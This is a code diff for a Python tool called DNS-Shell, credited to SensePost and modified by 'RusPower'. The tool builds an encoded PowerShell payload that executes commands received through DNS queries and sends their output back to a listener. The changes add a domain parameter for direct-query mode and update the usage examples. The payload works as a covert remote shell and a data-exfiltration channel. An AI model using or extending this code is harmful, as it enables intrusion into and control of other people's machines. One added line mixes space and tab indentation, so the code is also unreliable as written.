@@ -68,9 +68,10 @@ while (1){
 """ % (domain,)
    return powershell_encode(st2)
 
-def prepare_direct(ip):
+def prepare_direct(ip,domain):
    st2 = """
 $ip = "%s"
+$url = "%s"
 function execDNS($cmd) {
 $c = iex $cmd 2>&1 | Out-String;
 $u = [system.Text.Encoding]::UTF8.GetBytes($c);
@@ -105,7 +106,7 @@ while (1){
    elseif ($txt -match 'exit'){Exit}
    else{execDNS($txt)}
 }   
-""" % (ip,)
+""" % (ip,domain)
    return powershell_encode(st2)
 
 
@@ -243,6 +244,7 @@ ________    _______    _________           _________.__           .__  .__
         \/         \/        \/                  \/      \/     \/           
 
 								by research (at) SensePost
+                                                                modified by RusPower
 '''
 	cmds = []
 	cr = []
@@ -262,12 +264,13 @@ A Sort of DNS-SHell.
 Examples:
 
 # Generate base64 encoded PowerShell payload, run in listener direct queries mode and wait for interactive shell.
-sudo python DNS-Shell.py -l -d [Server IP]
+sudo python DNS-Shell.py -l -d [Server IP] -u [url for dns query|whatever]
 
 # Generate base64 encoded PowerShell payload, and run in listener recursive queries mode and wait for interactive shell.
 sudo python DNS-Shell.py -l -r [Domain]''')
 	parser.add_argument('-l','--listen',help='Activate listener mode.',action='store_true')
 	parser.add_argument('-r','--recursive',help='Recursive DNS query requests.')
+	parser.add_argument('-u','--url4direct',help='url prepared for direct DNS requests mode.')
 	parser.add_argument('-d','--direct',help='Direct DNS queries mode.')
 	p = parser.parse_args()
 	print logo
@@ -276,7 +279,8 @@ sudo python DNS-Shell.py -l -r [Domain]''')
 		print '[+} Listen direct queries mode active.'
 		listen = p.listen
 		ip = p.direct
-		penc = prepare_direct(ip)
+		domain = p.url4direct
+                penc = prepare_direct(ip,domain)
 		main(penc)
 	# listener recursive mode
 	elif p.listen and p.recursive:
